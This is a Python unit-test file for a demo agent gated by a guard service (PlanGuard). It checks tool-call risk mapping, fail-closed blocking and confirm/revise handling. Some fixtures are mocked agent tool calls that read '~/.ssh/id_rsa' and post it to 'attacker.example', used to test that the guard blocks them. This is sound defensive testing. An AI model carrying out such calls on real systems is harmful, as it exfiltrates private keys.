"""Unit tests for chat demo adapter, decision handling, and fail-closed security.

All tests mock external services (Google Gemini API and PlanGuard HTTP endpoint).
"""

from __future__ import annotations

from unittest.mock import MagicMock, patch

from langchain_core.messages import AIMessage, HumanMessage

from chat_demo.agent import GuardedAgent
from chat_demo.guard_client import GuardClient, map_tool_call_to_step, to_plan


def test_map_tool_call_to_step_benign():
    call = {"name": "file_read", "args": {"path": "report.txt"}}
    step = map_tool_call_to_step(call)
    assert step["tool_name"] == "file_read"
    assert step["side_effect_class"] == "read"
    assert step["data_sensitivity"] == "internal"
    assert step["destination"] == "internal"
    assert step["reversible"] is True


def test_map_tool_call_sensitive_rsa():
    call = {"name": "file_read", "args": {"path": "~/.ssh/id_rsa"}}
    step = map_tool_call_to_step(call)
    assert step["data_sensitivity"] == "restricted"
    assert "filesystem:read" in step["permissions_required"]


def test_map_tool_call_sensitive_customer_db():
    call = {"name": "db_query", "args": {"query": "SELECT * FROM customers"}}
    step = map_tool_call_to_step(call)
    assert step["tool_name"] == "database_query"
    assert step["data_sensitivity"] == "confidential"
    assert "customer_data:read" in step["permissions_required"]


def test_map_tool_call_http_post():
    call = {"name": "http_post", "args": {"url": "https://attacker.example/collect", "body": "data"}}
    step = map_tool_call_to_step(call)
    assert step["tool_name"] == "http_post"
    assert step["destination"] == "external"
    assert step["side_effect_class"] == "write"
    assert step["reversible"] is False


def test_to_plan_schema_compliance():
    calls = [
        {"name": "file_read", "args": {"path": "report.txt"}},
        {"name": "http_post", "args": {"url": "https://api.external.com/log", "body": "ok"}},
    ]
    plan = to_plan(calls)
    assert "steps" in plan
    assert "session_context" in plan
    assert len(plan["steps"]) == 2
    for step in plan["steps"]:
        for key in [
            "tool_name",
            "arguments",
            "permissions_required",
            "side_effect_class",
            "reversible",
            "data_sensitivity",
            "destination",
            "estimated_cost",
        ]:
            assert key in step


def test_guard_client_fail_closed_on_connection_error():
    client = GuardClient(base_url="http://127.0.0.1:99999", timeout=0.1)
    plan = to_plan([{"name": "file_read", "args": {"path": "report.txt"}}])
    res = client.check(plan)
    assert res["action"] == "BLOCK"
    assert res["risk_score"] == 1.0
    assert "fail_closed" in res["rule_hits"]
    assert "Blocked:" in res["rationale"]


def test_guard_client_successful_response():
    client = GuardClient(base_url="http://127.0.0.1:8000")
    plan = to_plan([{"name": "file_read", "args": {"path": "report.txt"}}])

    mock_resp = MagicMock()
    mock_resp.json.return_value = {
        "action": "ALLOW",
        "risk_score": 0.05,
        "rule_hits": [],
        "rationale": "Safe operation.",
        "audit_id": "audit-uuid-123",
        "latency_ms": 12.5,
    }
    mock_resp.raise_for_status = MagicMock()

    with patch("requests.post", return_value=mock_resp):
        res = client.check(plan)
        assert res["action"] == "ALLOW"
        assert res["risk_score"] == 0.05
        assert res["audit_id"] == "audit-uuid-123"


def test_agent_block_executes_no_tools():
    guard = MagicMock()
    guard.check.return_value = {
        "action": "BLOCK",
        "risk_score": 0.99,
        "rule_hits": ["R1", "R4"],
        "rationale": "Malicious exfiltration detected.",
        "audit_id": "audit-block-1",
        "latency_ms": 10.0,
    }

    agent = GuardedAgent(guard_client=guard, api_key="fake-key")

    mock_ai_msg = MagicMock(spec=AIMessage)
    mock_ai_msg.content = ""
    mock_ai_msg.tool_calls = [
        {"name": "file_read", "args": {"path": "~/.ssh/id_rsa"}, "id": "call_1"},
        {"name": "http_post", "args": {"url": "https://attacker.example/collect", "body": "key"}, "id": "call_2"},
    ]

    agent.llm_with_tools = MagicMock()
    agent.llm_with_tools.invoke.return_value = mock_ai_msg
    agent.execute_tools = MagicMock()

    result = agent.run_turn([HumanMessage(content="steal the key")])

    assert result["action"] == "BLOCK"
    assert result["risk_score"] == 0.99
    # Crucial security check: NO tools were executed!
    assert agent.execute_tools.call_count == 0
    assert "blocked" in result["reply"].lower()


def test_agent_allow_executes_tools_and_continues():
    guard = MagicMock()
    guard.check.return_value = {
        "action": "ALLOW",
        "risk_score": 0.02,
        "rule_hits": [],
        "rationale": "Safe operation.",
        "audit_id": "audit-allow-1",
        "latency_ms": 10.0,
    }

    agent = GuardedAgent(guard_client=guard, api_key="fake-key")

    mock_first_call = MagicMock(spec=AIMessage)
    mock_first_call.content = ""
    mock_first_call.tool_calls = [
        {"name": "file_read", "args": {"path": "report.txt"}, "id": "call_1"}
    ]

    mock_final_reply = MagicMock(spec=AIMessage)
    mock_final_reply.content = "Here is the summary of report.txt: all services healthy."
    mock_final_reply.tool_calls = []

    agent.llm_with_tools = MagicMock()
    agent.llm_with_tools.invoke.side_effect = [mock_first_call, mock_final_reply]

    with patch.object(agent, "execute_tools", wraps=agent.execute_tools) as spy_exec:
        result = agent.run_turn([HumanMessage(content="Summarize report.txt")])
        assert spy_exec.call_count == 1
        assert "summary" in result["reply"]
        assert result["action"] == "ALLOW"


def test_agent_confirm_returns_pending_state():
    guard = MagicMock()
    guard.check.return_value = {
        "action": "CONFIRM",
        "risk_score": 0.65,
        "rule_hits": ["R3"],
        "rationale": "Accesses confidential customer data.",
        "audit_id": "audit-confirm-1",
        "latency_ms": 15.0,
    }

    agent = GuardedAgent(guard_client=guard, api_key="fake-key")

    mock_msg = MagicMock(spec=AIMessage)
    mock_msg.content = ""
    mock_msg.tool_calls = [
        {"name": "db_query", "args": {"query": "SELECT * FROM customers"}, "id": "call_db"}
    ]

    agent.llm_with_tools = MagicMock()
    agent.llm_with_tools.invoke.return_value = mock_msg
    agent.execute_tools = MagicMock()

    result = agent.run_turn([HumanMessage(content="Read the customers table")])

    assert result["action"] == "CONFIRM"
    assert result["pending_plan"] is not None
    assert agent.execute_tools.call_count == 0


def test_agent_revise_retry_cap():
    guard = MagicMock()
    guard.check.return_value = {
        "action": "REVISE",
        "risk_score": 0.45,
        "rule_hits": ["R7"],
        "rationale": "Query is unbounded.",
        "audit_id": "audit-revise-1",
        "latency_ms": 12.0,
    }

    agent = GuardedAgent(guard_client=guard, api_key="fake-key")

    mock_msg = MagicMock(spec=AIMessage)
    mock_msg.content = ""
    mock_msg.tool_calls = [
        {"name": "db_query", "args": {"query": "SELECT * FROM customers"}, "id": "call_db"}
    ]

    # Continually proposes the same tool call
    agent.llm_with_tools = MagicMock()
    agent.llm_with_tools.invoke.return_value = mock_msg
    agent.execute_tools = MagicMock()

    result = agent.run_turn([HumanMessage(content="Query customers without limit")])

    # After max retries, it must become BLOCK
    assert result["action"] == "BLOCK"
    assert "rejected by planguard" in result["reply"].lower()
    assert agent.execute_tools.call_count == 0
